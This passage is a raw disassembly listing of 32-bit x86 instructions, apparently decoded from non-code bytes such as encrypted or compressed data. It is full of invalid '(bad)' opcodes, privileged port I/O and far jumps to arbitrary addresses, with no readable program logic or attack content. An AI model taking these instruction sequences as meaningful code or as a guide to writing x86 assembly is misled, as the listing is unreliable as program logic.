  4017d3:	xchg   BYTE PTR [esi+edx*4],bl
  4017d6:	in     al,0x44
  4017d8:	cld    
  4017d9:	xchg   ebp,eax
  4017da:	stos   DWORD PTR es:[edi],eax
  4017db:	add    BYTE PTR [eax+0x67],0xa4
  4017df:	adc    ebx,edi
  4017e1:	int    0x2c
  4017e3:	aam    0xa2
  4017e5:	bound  eax,QWORD PTR [edi+0x3b]
  4017e8:	mov    ebp,0xa7c3869d
  4017ed:	fdivr  QWORD PTR [edx]
  4017ef:	cdq    
  4017f0:	loopne 0x40186f
  4017f2:	popf   
  4017f3:	int3   
  4017f4:	push   ss
  4017f5:	mov    cl,0x23
  4017f7:	stos   DWORD PTR es:[edi],eax
  4017f8:	icebp  
  4017f9:	ins    DWORD PTR es:[edi],dx
  4017fa:	sub    eax,ecx
  4017fc:	or     al,0x27
  4017fe:	inc    ebp
  4017ff:	and    DWORD PTR [edx+0x20],0xffffff8c
  401803:	call   0x7986:0x9f3a89e7
  40180a:	xchg   esp,eax
  40180b:	imul   esp,esi,0xa676e2b3
  401811:	push   DWORD PTR [esi]
  401813:	mov    ch,0x82
  401815:	adc    al,0xe0
  401817:	ret    0xa6cb
  40181a:	ins    BYTE PTR es:[edi],dx
  40181b:	push   ds
  40181c:	aaa    
  40181d:	jbe    0x401879
  40181f:	daa    
  401820:	push   ds
  401821:	cwde   
  401822:	lds    edi,FWORD PTR ds:0xa111caa7
  401828:	pop    edi
  401829:	arpl   WORD PTR [esi+ecx*8],bx
  40182c:	bound  ebp,QWORD PTR [ebx]
  40182e:	js     0x40186e
  401830:	out    dx,eax
  401831:	push   esi
  401832:	inc    BYTE PTR [ebp-0x80]
  401835:	jnp    0x401893
  401837:	dec    esp
  401838:	jge    0x401871
  40183a:	mov    ebp,0x2b04408c
  40183f:	pushf  
  401840:	popf   
  401841:	js     0x401807
  401843:	sbb    eax,0xa5055ceb
  401848:	scas   al,BYTE PTR es:[edi]
  401849:	lahf   
  40184a:	clc    
  40184b:	sti    
  40184c:	push   edx
  40184d:	dec    esp
  40184e:	or     dl,BYTE PTR [ebx]
  401850:	neg    BYTE PTR [edi+eax*2-0x5c94d655]
  401857:	test   BYTE PTR [ebx+0x3f],bh
  40185a:	imul   edi,DWORD PTR [ecx+0x487894f],0x44b7538e
  401864:	pop    ebx
  401865:	inc    eax
  401866:	loopne 0x401817
  401868:	adc    al,0xba
  40186a:	xchg   ebx,eax
  40186b:	lock dec esi
  40186d:	or     BYTE PTR [eax+0x58],dl
  401870:	cli    
  401871:	aaa    
  401872:	(bad)  
  401874:	mov    ebx,gs
  401876:	scas   eax,DWORD PTR es:[edi]
  401877:	es inc edx
  401879:	jne    0x4017ff
  40187b:	add    DWORD PTR [ebp+0x42],esp
  40187e:	(bad)  
  40187f:	ss mov esp,0x9b172ce4
  401885:	jae    0x401833
  401887:	pop    esi
  401888:	sub    ecx,ebp
  40188a:	ins    DWORD PTR es:[edi],dx
  40188b:	test   al,0xb1
  40188d:	mov    esi,0x5e74a8eb
  401892:	xchg   BYTE PTR [eax-0x3a7d8304],bl
  401898:	in     al,0x41
  40189a:	jle    0x4018fe
  40189c:	sub    DWORD PTR [ebp-0x7fc64a2],0x1
  4018a3:	jmp    0x2aa74aee
  4018a8:	xchg   ecx,eax
  4018a9:	mov    eax,ds:0xcd40cd6a
  4018ae:	mov    al,ds:0xe562e454
  4018b3:	out    dx,al
  4018b4:	addr16 cli 
  4018b6:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4018b8:	jmp    0x4018ad
  4018ba:	dec    edx
  4018bb:	in     al,0x3c
  4018bd:	mov    DWORD PTR ds:[ecx],ecx
  4018c0:	stos   BYTE PTR es:[edi],al
  4018c1:	imul   ebx,edx,0xffffff92
  4018c4:	inc    ebp
  4018c5:	ror    bh,1
  4018c7:	ret    0xff7
  4018ca:	call   0xc6098a68
  4018cf:	out    dx,eax
  4018d0:	push   cs
  4018d1:	inc    ecx
  4018d2:	aad    0x4f
  4018d4:	jo     0x401886
  4018d6:	inc    eax
  4018d7:	and    edi,DWORD PTR [eax+0x7]
  4018da:	not    DWORD PTR [edx]
  4018dc:	(bad)  
  4018dd:	cld    
  4018de:	dec    ebx
  4018df:	jb     0x4018a7
  4018e1:	shr    BYTE PTR [ebx-0x19],0xbd
  4018e5:	lods   eax,DWORD PTR fs:[esi]
  4018e7:	std    
  4018e8:	mov    ch,0x91
  4018ea:	jg     0x40194d
  4018ec:	jae    0x4018d4
  4018ee:	pop    ecx
  4018ef:	adc    edi,DWORD PTR gs:[edi]
  4018f2:	xor    edi,DWORD PTR [eax+0x7bdd719]
  4018f8:	cmp    BYTE PTR [edi-0x68a7004e],ah
  4018fe:	sbb    ah,BYTE PTR [edx-0x56]
  401901:	(bad)  
  401902:	outs   dx,BYTE PTR ds:[esi]
  401903:	mov    cs,WORD PTR [eax]
  401905:	in     eax,dx
  401906:	(bad)  
  401907:	mov    ebx,0xda76cf75
  40190c:	in     eax,dx
  40190d:	hlt    
  40190e:	jg     0x401972
  401910:	add    eax,0x543a9604
  401915:	inc    ecx
  401916:	fisttp QWORD PTR [edx]
  401918:	imul   eax,eax,0xdabc9621
  40191e:	pop    ebp
  40191f:	shl    BYTE PTR [edi+eax*4+0x7a88b089],1
  401926:	js     0x4018d6
  401928:	mov    DWORD PTR [esi],0x19807543
  40192e:	mov    al,BYTE PTR [ecx+ebx*8+0x26]
  401932:	retf   
  401933:	lds    esp,FWORD PTR [ecx-0x23]
  401936:	fcmovnbe st,st(1)
  401938:	mov    bl,0xb3
  40193a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40193b:	xchg   edx,eax
  40193c:	cli    
  40193d:	imul   edi,DWORD PTR [edi+edx*2],0xa7ad96bf
  401944:	add    BYTE PTR [edx-0x1b],dh
  401947:	retf   0x81aa
  40194a:	sbb    ah,BYTE PTR [eax]
  40194c:	mov    dl,0xc
  40194e:	xchg   DWORD PTR [edi-0x66a439f9],edx
  401954:	jae    0x401925
  401956:	jo     0x401985
  401958:	mov    dl,ch
  40195a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40195b:	inc    eax
  40195c:	xor    edx,DWORD PTR ds:0x7fa7bbfa
  401962:	xlat   BYTE PTR ds:[ebx]
  401963:	stos   BYTE PTR es:[edi],al
  401964:	hlt    
  401965:	inc    edi
  401966:	xor    eax,0x1bd1320b
  40196b:	push   0x414b2b25
  401970:	cwde   
  401971:	fld    QWORD PTR [esi+esi*1+0x75ebe0e0]
  401978:	inc    edi
  401979:	(bad)  
  40197a:	xor    bl,BYTE PTR [ecx]
  40197c:	sub    eax,0x288120bc
  401981:	jle    0x401986
  401983:	mov    ds:0x468fdf7d,al
  401988:	pop    ss
  401989:	or     BYTE PTR [ebp-0x7],dl
  40198c:	popa   
  40198d:	pop    edi
  40198e:	aad    0x73
  401990:	inc    eax
  401991:	int3   
  401992:	stos   BYTE PTR es:[edi],al
  401993:	sub    eax,0xe4939353
  401998:	(bad)  
  401999:	jmp    0x4019ad
  40199b:	and    edi,DWORD PTR [ecx-0x48]
  40199e:	int    0xf3
  4019a0:	jecxz  0x40197e
  4019a2:	jns    0x4019d3
  4019a4:	xor    cl,ch
  4019a6:	cs loope 0x4019bf
  4019a9:	push   ebx
  4019aa:	test   eax,0x1a1b9be0
  4019af:	pop    ecx
  4019b0:	xchg   esi,eax
  4019b1:	or     esp,DWORD PTR ds:0x9512dab6
  4019b7:	test   eax,0x8dce3267
  4019bc:	xor    esp,ebx
  4019be:	xor    al,0x7b
  4019c0:	mov    BYTE PTR [ebp-0x49],dh
  4019c3:	enter  0x659b,0x81
  4019c7:	(bad)  
  4019c8:	adc    eax,0x20f67f6d
  4019cd:	imul   esi,DWORD PTR ds:0x1565c79b,0xffffff98
  4019d4:	xor    esi,ecx
  4019d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019d7:	cmp    dl,BYTE PTR ds:0x31e2a7fa
  4019dd:	stos   BYTE PTR es:[edi],al
  4019de:	inc    eax
  4019df:	dec    edi
  4019e0:	and    cl,BYTE PTR [ebp+0x5b8417d5]
  4019e6:	mov    ebx,0xd9e44f8a
  4019eb:	sbb    BYTE PTR [eax+0x4c4d9338],0x3
  4019f2:	fisttp QWORD PTR ss:[ebx+0x1f]
  4019f6:	jb     0x401a34
  4019f8:	int    0xbb
  4019fa:	jmp    0x401a03
  4019fc:	sbb    ebp,eax
  4019fe:	and    BYTE PTR [edi+ecx*1],bh
  401a01:	lods   eax,DWORD PTR ds:[esi]
  401a02:	jo     0x40199c
  401a04:	rcl    BYTE PTR [edi],1
  401a06:	inc    esp
  401a07:	inc    ebp
  401a08:	in     eax,dx
  401a09:	shl    BYTE PTR [eax+eiz*4+0x5],0x4e
  401a0e:	pop    ecx
  401a0f:	cmp    ebx,ecx
  401a11:	cmp    eax,0xbd0e1d28
  401a16:	fiadd  WORD PTR [ebp-0x27]
  401a19:	cmp    BYTE PTR [edx+edx*8+0x4],dh
  401a1d:	dec    esp
  401a1e:	retf   0x6b4d
  401a21:	cmp    al,0xb8
  401a23:	inc    eax
  401a24:	mov    ah,0xea
  401a26:	jge    0x401a47
  401a28:	jns    0x401a2c
  401a2a:	or     DWORD PTR [eax-0xe],ebx
  401a2d:	call   0xbee0:0xb8fd145a
  401a34:	cmp    ecx,DWORD PTR [esi]
  401a36:	push   ebx
  401a37:	ins    BYTE PTR es:[edi],dx
  401a38:	and    esp,DWORD PTR [eax]
  401a3a:	jns    0x4019c2
  401a3c:	mov    dl,0x76
  401a3e:	mov    ch,0x7b
  401a40:	push   es
  401a41:	sub    eax,0xd8624322
  401a46:	push   esi
  401a47:	mov    esi,DWORD PTR [eax]
  401a49:	xchg   BYTE PTR [ebp+0x28abc093],al
  401a4f:	sub    DWORD PTR [eax+0x45543a16],0xffffff99
  401a56:	jge    0x401a63
  401a58:	shl    BYTE PTR [esi],0x1f
  401a5b:	outs   dx,DWORD PTR ds:[esi]
  401a5c:	in     eax,dx
  401a5d:	fidiv  WORD PTR [ebx+0x31f70976]
  401a63:	cmp    esi,DWORD PTR [ecx-0x458b8f91]
  401a69:	xchg   ebx,eax
  401a6a:	push   ebx
  401a6b:	sahf   
  401a6c:	cmp    cl,0xa1
  401a6f:	xchg   edi,eax
  401a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a71:	call   0xeb47:0x6bc83a0f
  401a78:	call   0xece6:0xe949d90c
  401a7f:	ja     0x401a8d
  401a81:	inc    BYTE PTR [eax]
  401a83:	sti    
  401a84:	hlt    
  401a85:	push   edx
  401a86:	pop    esi
  401a87:	jecxz  0x401a2d
  401a89:	sbb    eax,0x78e9f772
  401a8e:	sub    ah,BYTE PTR [edi+edi*1+0x63c98ff]
  401a95:	cmp    edx,ebp
  401a97:	pop    esp
  401a98:	je     0x401a1f
  401a9a:	sub    al,0xa1
  401a9c:	lods   al,BYTE PTR ds:[esi]
  401a9d:	inc    ecx
  401a9e:	dec    ecx
  401a9f:	add    DWORD PTR [esi+0x7dea4630],eax
  401aa5:	dec    ebx
  401aa6:	sub    bh,BYTE PTR ss:[bx+si]
  401aaa:	pusha  
  401aab:	inc    esi
  401aac:	xor    DWORD PTR [esp+ebx*8+0x9],0x57563666
  401ab4:	cli    
  401ab5:	test   DWORD PTR [edi],edx
  401ab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ab8:	push   0xffffffe4
  401aba:	scas   al,BYTE PTR es:[edi]
  401abb:	das    
  401abc:	jp     0x401ace
  401abe:	(bad)  [edi+edi*4+0x7b282ab9]
  401ac5:	push   0x48ff1029
  401aca:	into   
  401acb:	test   al,bh
  401acd:	or     eax,DWORD PTR [esi-0x1e]
  401ad0:	mov    ah,0x32
  401ad2:	and    BYTE PTR [ecx+0x1e28e21],0x31
  401ad9:	in     al,dx
  401ada:	aaa    
  401adb:	push   cs
  401adc:	loopne 0x401a84
  401ade:	cmp    DWORD PTR [edx],ebx
  401ae0:	mov    edx,0x4197c97e
  401ae5:	pop    ecx
  401ae6:	imul   eax,ecx,0xffffff92
  401ae9:	xchg   edx,eax
  401aea:	pop    ecx
  401aeb:	(bad)  
  401aed:	inc    esp
  401aee:	or     cl,cl
  401af0:	mov    bh,bl
  401af2:	mov    eax,0x37d0ac1d
  401af7:	test   BYTE PTR [edx-0x2f],cl
  401afa:	addr16 push ds
  401afc:	call   0x61f71d3
  401b01:	in     al,dx
  401b02:	out    0x9e,al
  401b04:	adc    cl,BYTE PTR [ecx*8+0x16bceee]
  401b0b:	test   eax,0xe69a280a
  401b10:	sub    al,0x1b
  401b12:	jno    0x401b26
  401b14:	dec    esi
  401b15:	hlt    
  401b16:	js     0x401b03
  401b18:	xchg   edi,eax
  401b19:	dec    eax
  401b1a:	cmp    bl,BYTE PTR [ebp+ebp*4-0x570f2144]
  401b21:	rcr    BYTE PTR [esp+ebp*8+0x3f],1
  401b25:	pop    ds
  401b26:	popf   
  401b27:	leave  
  401b28:	fnstcw WORD PTR [ebp-0x51]
  401b2b:	sbb    al,0xcb
  401b2d:	(bad)  
  401b2e:	xlat   BYTE PTR ds:[ebx]
  401b2f:	or     eax,0x2e23c1a9
  401b34:	pop    edx
  401b35:	cmp    edi,DWORD PTR [eax]
  401b37:	xchg   DWORD PTR [ebp+0x2cd16fe8],ebp
  401b3d:	sbb    al,0x3b
  401b3f:	xchg   edi,eax
  401b40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b41:	or     al,0xea
  401b43:	xlat   BYTE PTR ds:[ebx]
  401b44:	adc    edi,esi
  401b46:	push   ecx
  401b47:	(bad)  
  401b49:	push   ecx
  401b4a:	(bad)  
  401b4b:	add    BYTE PTR [esi+0x4be76204],dh
  401b51:	arpl   WORD PTR [esi-0x7a345d24],sp
  401b57:	in     al,dx
  401b58:	mov    fs,esp
  401b5a:	or     bh,BYTE PTR [ebx+eax*4]
  401b5d:	ins    BYTE PTR es:[edi],dx
  401b5e:	dec    edx
  401b5f:	push   cs
  401b60:	shl    BYTE PTR [ebp+0x2c81f78e],1
  401b66:	(bad)  
  401b67:	mov    esi,0x66d7df11
  401b6c:	dec    edx
  401b6d:	xor    ebp,edx
  401b6f:	les    edx,FWORD PTR [esi-0x2d92f293]
  401b75:	hlt    
  401b76:	fsub   st(6),st
  401b78:	test   DWORD PTR [edx+0x8],ebp
  401b7b:	xor    eax,0xf3831b4d
  401b80:	mov    eax,0x2e9cd623
  401b85:	mov    esp,0x7f71f00b
  401b8a:	push   ebx
  401b8b:	mov    esp,0x98c9137f
  401b90:	(bad)  
  401b91:	push   esp
  401b92:	gs dec ecx
  401b94:	ss popa 
  401b96:	retf   
  401b97:	sub    BYTE PTR [esi],bl
  401b99:	dec    edi
  401b9a:	dec    edx
  401b9b:	jmp    0xf629189c
  401ba0:	mov    esi,0x844e3d2a
  401ba5:	icebp  
  401ba6:	lods   al,BYTE PTR ds:[esi]
  401ba7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ba8:	inc    edi
  401ba9:	or     esi,DWORD PTR [ecx]
  401bab:	mov    ebx,0x5b82a984
  401bb0:	dec    edx
  401bb1:	push   0x684634d1
  401bb6:	cmp    al,0xcc
  401bb8:	and    ebx,DWORD PTR [eax+0x7f96a267]
  401bbe:	call   0x1640:0x3c5e0d20
  401bc5:	icebp  
  401bc6:	jmp    0x9af8181f
  401bcb:	mov    BYTE PTR [ebp-0x67],ah
  401bce:	retf   0x6b4e
  401bd1:	lds    ebx,FWORD PTR [edx]
  401bd3:	xchg   edi,eax
  401bd4:	aad    0xac
  401bd6:	sbb    DWORD PTR [edi+0x41],ecx
  401bd9:	inc    eax
  401bda:	mov    al,ds:0xa14fb192
  401bdf:	out    dx,al
  401be0:	cmp    eax,0x7cbddad5
  401be5:	dec    edx
  401be6:	cmp    al,0xc7
  401be8:	nop
  401be9:	mov    esi,0x29b16447
  401bee:	cmp    al,0x43
  401bf0:	fidivr WORD PTR [edx+0x31]
  401bf3:	or     ecx,esp
  401bf5:	pop    ebx
  401bf6:	adc    esi,ecx
  401bf8:	mov    ch,0xf5
  401bfa:	push   ds
  401bfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bfc:	dec    eax
  401bfd:	fst    QWORD PTR [edx+ebx*1+0x4c]
  401c01:	mov    bh,0xdd
  401c03:	jns    0x401bed
  401c05:	sahf   
  401c06:	add    ebx,ebp
  401c08:	push   0x66
  401c0a:	dec    esp
  401c0b:	mov    edi,0x7fe98f29
  401c10:	jmp    0xb798aa59
  401c15:	push   cs
  401c16:	stc    
  401c17:	adc    BYTE PTR [ecx+0x485da2e8],ch
  401c1d:	(bad)  ds:0x81e9eb
  401c23:	in     eax,dx
  401c24:	stc    
  401c25:	loope  0x401c32
  401c27:	or     eax,DWORD PTR [esi+0x25f68137]
  401c2d:	mov    ebp,0x1b99863d
  401c32:	out    0xfb,al
  401c34:	xor    ah,bl
  401c36:	xlat   BYTE PTR ds:[ebx]
  401c37:	ret    
  401c38:	xchg   esp,eax
  401c39:	cli    
  401c3a:	cmp    BYTE PTR [esi+0x7d],bh
  401c3d:	add    al,0xc5
  401c3f:	cwde   
  401c40:	adc    al,0xa4
  401c42:	inc    ecx
  401c43:	push   ebp
  401c44:	pop    edx
  401c45:	adc    ebx,edx
  401c47:	sub    ecx,esp
  401c49:	out    dx,eax
  401c4a:	push   ecx
  401c4b:	push   edx
  401c4c:	xor    edi,edx
  401c4e:	jmp    0x598f5bc9
  401c53:	push   edi
  401c54:	(bad)  
  401c55:	fcomp  QWORD PTR [edx]
  401c57:	and    bl,ch
  401c59:	mov    bh,0xaf
  401c5b:	pop    edi
  401c5c:	sub    bl,BYTE PTR [ebx-0x5e]
  401c5f:	and    al,0xf3
  401c61:	iret   
  401c62:	mov    BYTE PTR [ebx],bl
  401c64:	loopne 0x401c22
  401c66:	pop    ds
  401c67:	mov    ebx,0x7008d7b5
  401c6c:	or     eax,0x63bb37a1
  401c71:	fmul   QWORD PTR [edx]
  401c73:	jmp    0x401c97
  401c75:	sbb    edi,DWORD PTR [ebp+0x2]
  401c78:	addr16 fs sub eax,0x29cf0d
  401c7f:	arpl   WORD PTR [ecx+eiz*4],dx
  401c82:	in     eax,dx
  401c83:	retf   0x4bc
  401c86:	pop    ecx
  401c87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c88:	mov    eax,ds:0x1c6d8061
  401c8d:	pop    edx
  401c8e:	fwait
  401c8f:	mov    ah,0x6e
  401c91:	xor    edi,ecx
  401c93:	pop    eax
  401c94:	xor    cl,BYTE PTR [ebx]
  401c96:	push   edi
  401c97:	sub    ch,BYTE PTR [ebx-0x49]
  401c9a:	or     esp,DWORD PTR [esi]
  401c9c:	jnp    0x401c26
  401c9e:	pop    esp
  401c9f:	clc    
  401ca0:	lock es stc 
  401ca3:	cmp    BYTE PTR ds:0x64c4f542,dh
  401ca9:	jo     0x401c82
  401cab:	cmp    BYTE PTR [ebp+0x2c32e32c],ah
  401cb1:	mov    ebx,0xe4735a6d
  401cb6:	rcr    DWORD PTR [ebp-0x28],cl
  401cb9:	sub    al,0x17
  401cbb:	call   0x16e0:0xc2a6f718
  401cc2:	push   es
  401cc3:	fld    QWORD PTR [ebx-0x56]
  401cc6:	add    al,0x8c
  401cc8:	xor    dl,BYTE PTR [ecx-0x7aa5e6b7]
  401cce:	jmp    0x9646:0x4a525769
  401cd5:	jns    0x401d0e
  401cd7:	(bad)  
  401cd9:	mov    al,ds:0xb016a88
  401cde:	lock inc eax
  401ce0:	mov    bl,0xe
  401ce2:	cmp    ch,BYTE PTR [esp+ecx*2-0x57a3954f]
  401ce9:	mov    BYTE PTR [edi],cl
  401ceb:	sub    cl,al
  401ced:	test   BYTE PTR ds:0xe716b89d,dh
  401cf3:	jb     0x401d41
  401cf5:	sbb    BYTE PTR [ebx+0x4e],cl
  401cf8:	sub    BYTE PTR [esp+eax*8-0x25],ch
  401cfc:	popa   
  401cfd:	push   ebp
  401cfe:	xor    BYTE PTR ds:0x401f0fb7,ch
  401d04:	dec    esi
  401d05:	inc    ecx
  401d06:	ret    
  401d07:	into   
  401d08:	and    edi,DWORD PTR [edi-0x2d]
  401d0b:	pop    es
  401d0c:	and    esi,DWORD PTR [esi+0x3f]
  401d0f:	or     esi,DWORD PTR [ecx]
  401d11:	out    dx,al
  401d12:	sub    ebx,DWORD PTR [ecx-0x76b420d0]
  401d18:	adc    DWORD PTR [eax],esp
  401d1a:	ret    
  401d1b:	cwde   
  401d1c:	push   es
  401d1d:	push   eax
  401d1e:	in     eax,0xc5
  401d20:	test   al,0x7f
  401d22:	inc    ebx
  401d23:	mov    dl,0x78
  401d25:	push   ss
  401d26:	jne    0x401cb7
  401d28:	repz mov dh,0xa7
  401d2b:	mov    esp,0xf6152c4d
  401d30:	xchg   DWORD PTR [ecx],esp
  401d32:	sbb    dh,BYTE PTR [edx+0x36a15a0f]
  401d38:	das    
  401d39:	push   esp
  401d3a:	fimul  WORD PTR ds:0x66d7f119
  401d40:	jnp    0x401d47
  401d42:	into   
  401d43:	jmp    0x533ebd26
  401d48:	iret   
  401d49:	dec    ecx
  401d4a:	or     esi,DWORD PTR [eax+0x78]
  401d4d:	mov    ebp,0xc31843b7
  401d52:	jae    0x401da3
  401d54:	(bad)  
  401d56:	sti    
  401d57:	retf   
  401d58:	enter  0x77e7,0xbe
  401d5c:	in     al,dx
  401d5d:	and    edx,DWORD PTR ds:0xa963dc79
  401d63:	pop    esi
  401d64:	in     al,dx
  401d65:	adc    al,0x35
  401d67:	pop    ebx
  401d68:	outs   dx,BYTE PTR ds:[esi]
  401d69:	imul   edi,DWORD PTR [ecx-0x38],0xb3be89c7
  401d70:	cmp    al,0xfb
  401d72:	out    0xab,al
  401d74:	es fcmovne st,st(3)
  401d77:	inc    eax
  401d78:	xchg   edx,eax
  401d79:	(bad)  
  401d7b:	cmp    al,0x45
  401d7d:	test   ch,ah
  401d7f:	sub    BYTE PTR [ebp+0xf],0x9c
  401d83:	into   
  401d84:	dec    edi
  401d85:	in     al,dx
  401d86:	daa    
  401d87:	mov    cl,0xe4
  401d89:	iret   
  401d8a:	arpl   WORD PTR [edi+edx*1-0x79],dx
  401d8e:	int    0x9b
  401d90:	loop   0x401da6
  401d92:	push   ecx
  401d93:	jae    0x401d39
  401d95:	repz or al,0xde
  401d98:	lea    eax,[eax-0x3b4572d5]
  401d9e:	mov    ch,0x9b
  401da0:	mov    edi,0x724b31d6
  401da5:	call   0x481c7e64
  401daa:	jp     0x401df6
  401dac:	push   ebp
  401dad:	xchg   DWORD PTR [ebx-0x9],esi
  401db0:	ret    0x5cc
  401db3:	cdq    
  401db4:	popf   
  401db5:	arpl   bx,ax
  401db7:	jp     0x401e0b
  401db9:	(bad)  
  401dbb:	sbb    ebp,edi
  401dbd:	push   0x7929bad1
  401dc2:	xchg   ebx,eax
  401dc3:	xchg   esi,eax
  401dc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401dc5:	je     0x401d5b
  401dc7:	outs   dx,DWORD PTR ds:[esi]
  401dc8:	or     ah,BYTE PTR [esi+edx*1]
  401dcb:	shl    BYTE PTR [edx-0x6c],cl
  401dce:	adc    al,0x64
  401dd0:	imul   edx,DWORD PTR [ebx-0x2d],0xfffffff4
  401dd4:	jl     0x401e2b
  401dd6:	cmp    al,0xa3
  401dd8:	add    eax,0xc1510dde
  401ddd:	aaa    
  401dde:	and    eax,0x5decc256
  401de3:	into   
  401de4:	ret    
  401de5:	adc    BYTE PTR [edi-0x122254bb],al
  401deb:	jnp    0x401dfe
  401ded:	icebp  
  401dee:	das    
  401def:	sar    dh,cl
  401df1:	js     0x401e0e
  401df3:	mov    al,ds:0x1ba167d3
  401df8:	mov    ebp,0x730a3128
  401dfd:	cmp    ebp,DWORD PTR [ecx*8+0x5d9ee72a]
  401e04:	clc    
  401e05:	inc    esi
  401e06:	pop    edi
  401e07:	int    0x42
  401e09:	mov    ebx,0xb510c91d
  401e0e:	aad    0x57
  401e10:	idiv   esi
  401e12:	sbb    esp,DWORD PTR [ecx+0x1d7d2e4c]
  401e18:	add    DWORD PTR [ecx+0x3f],ebp
  401e1b:	cmp    DWORD PTR ds:0x14a7e283,ecx
  401e21:	ror    BYTE PTR [eax-0x31b2394d],0x85
  401e28:	aad    0x2a
  401e2a:	mov    dh,0xcd
  401e2c:	call   0x49e7:0xa6ca24f
  401e33:	xor    ecx,DWORD PTR [esi]
  401e35:	(bad)  
  401e36:	fdivrp st(1),st
  401e38:	push   esp
  401e39:	jecxz  0x401e08
  401e3b:	jmp    0x8aee:0x8604e7e0
  401e42:	push   es
  401e43:	jle    0x401e32
  401e45:	(bad)  
  401e46:	hlt    
  401e47:	shl    DWORD PTR [eax+0x44],1
  401e4a:	mov    esi,0xe990b257
  401e4f:	adc    BYTE PTR [esi+0x4f26c7ce],dh
  401e55:	and    BYTE PTR [ebx+0x7],dl
  401e58:	and    DWORD PTR [ebp-0x64],0x4c
  401e5c:	nop
  401e5d:	sub    al,0x93
  401e5f:	js     0x401e36
  401e61:	and    eax,0x864fac44
  401e66:	add    BYTE PTR [edi+eax*4+0x77],cl
  401e6a:	popf   
  401e6b:	cmp    ch,dl
  401e6d:	pusha  
  401e6e:	add    dh,BYTE PTR [eax+0x73f7f96]
  401e74:	adc    ch,ah
  401e76:	dec    eax
  401e77:	inc    esp
  401e78:	pop    ss
  401e79:	mov    ebp,0x9049d519
  401e7e:	ss pop es
  401e80:	or     bh,bh
  401e82:	sub    al,cl
  401e84:	add    ebx,DWORD PTR [ecx+0x21]
  401e87:	rcr    DWORD PTR [eax+0x2827431],cl
  401e8d:	cmp    eax,0x5ee16315
  401e92:	mov    dl,0xd
  401e94:	inc    esi
  401e95:	repz sub DWORD PTR [ebx],edi
  401e98:	(bad)  
  401e9a:	mov    ds:0x821f0c58,al
  401e9f:	call   0x829a:0xac21706f
  401ea6:	pop    ebx
  401ea7:	and    ecx,DWORD PTR [edi+ebx*4+0x31]
  401eab:	mov    ch,0x7e
  401ead:	daa    
  401eae:	dec    esp
  401eaf:	leave  
  401eb0:	cmp    al,0x25
  401eb2:	rcr    esp,cl
  401eb4:	in     eax,0xe
  401eb6:	sbb    BYTE PTR [ebx+0x48],bl
  401eb9:	pop    ebx
  401eba:	ja     0x401e69
  401ebc:	dec    esp
  401ebd:	sbb    edx,DWORD PTR [ebx+ebp*2-0x7d]
  401ec1:	pfmul  mm5,mm4
  401ec5:	or     BYTE PTR [esi-0x5bc5747f],al
  401ecb:	dec    eax
  401ecc:	ror    ebp,0x5c
  401ecf:	rcl    BYTE PTR [ebx],0xdb
  401ed2:	retf   0xa35b
  401ed5:	jb     0x401e6d
  401ed7:	loopne 0x401e93
  401ed9:	push   edi
  401eda:	sahf   
  401edb:	cli    
  401edc:	add    DWORD PTR [ecx],edx
  401ede:	lea    edx,[eax+0x373096f2]
  401ee4:	pop    ebx
  401ee5:	repz and DWORD PTR [eax+0x28],ebp
  401ee9:	repz add eax,0x2badc705
  401eef:	sbb    esi,ecx
  401ef1:	popf   
  401ef2:	and    eax,0x51367322
  401ef7:	sbb    BYTE PTR [edx-0x7a],bl
  401efa:	xchg   esp,eax
  401efb:	adc    BYTE PTR [ebp+0x6dce9c37],dl
  401f01:	sahf   
  401f02:	jle    0x401f38
  401f04:	cmp    eax,0xc0013193
  401f09:	jne    0x401f3b
  401f0b:	xor    bh,dh
  401f0d:	(bad)  
  401f0e:	cmp    eax,0xa389891b
  401f13:	pop    ebp
  401f14:	lahf   
  401f15:	and    esp,esp
  401f17:	jb     0x401f98
  401f19:	rcr    eax,0x18
  401f1c:	sub    eax,0x47c003bb
  401f21:	inc    esi
  401f22:	das    
  401f23:	mov    eax,ds:0x5f61faf4
  401f28:	dec    ecx
  401f29:	push   ebp
  401f2a:	rcr    DWORD PTR [edi-0x5c3768bc],0x1d
  401f31:	ds mov DWORD PTR cs:[esi],esp
  401f35:	cld    
  401f36:	xor    al,0x2
  401f38:	jecxz  0x401fa4
  401f3a:	pop    ds
  401f3b:	clc    
  401f3c:	sub    BYTE PTR [eax+0x4e],0x89
  401f40:	imul   eax,DWORD PTR [edx-0x61],0x15f703db
  401f47:	nop
  401f48:	icebp  
  401f49:	and    BYTE PTR [ebx+eax*8],bh
  401f4c:	and    ecx,DWORD PTR [ecx-0x6be0737e]
  401f52:	mov    ecx,ds
  401f54:	stc    
  401f55:	mov    gs,edx
  401f57:	popa   
  401f58:	lods   al,BYTE PTR ds:[esi]
  401f59:	call   0xcfd4:0x750e405f
  401f60:	or     BYTE PTR [ebp+0x6eb95e76],ah
  401f66:	jns    0x401fa1
  401f68:	sbb    ecx,DWORD PTR [esi]
  401f6a:	ror    DWORD PTR ds:0x470fc0bb,cl
  401f70:	in     eax,0xe6
  401f72:	inc    ebp
  401f73:	imul   BYTE PTR [edi]
  401f75:	in     eax,0x3
  401f77:	(bad)  
  401f78:	aam    0x68
  401f7a:	(bad)  
  401f7b:	es sbb al,0x8b
  401f7e:	push   edx
  401f7f:	adc    ecx,DWORD PTR [edi+0x37]
  401f82:	mov    bl,0x99
  401f84:	pop    ecx
  401f85:	jp     0x401f8f
  401f87:	push   ecx
  401f88:	repnz xor esp,DWORD PTR [esi-0x6a86aa69]
  401f8f:	pop    edx
  401f90:	push   edx
  401f91:	push   ss
  401f92:	cmp    DWORD PTR [edx+0x19],ebp
  401f95:	add    esp,DWORD PTR [ebp-0x78]
  401f98:	jmp    0x401f9b
  401f9a:	aad    0x73
  401f9c:	in     eax,dx
  401f9d:	push   0x198302d6
  401fa2:	xchg   ebp,eax
  401fa3:	int    0x7c
  401fa5:	loope  0x401faa
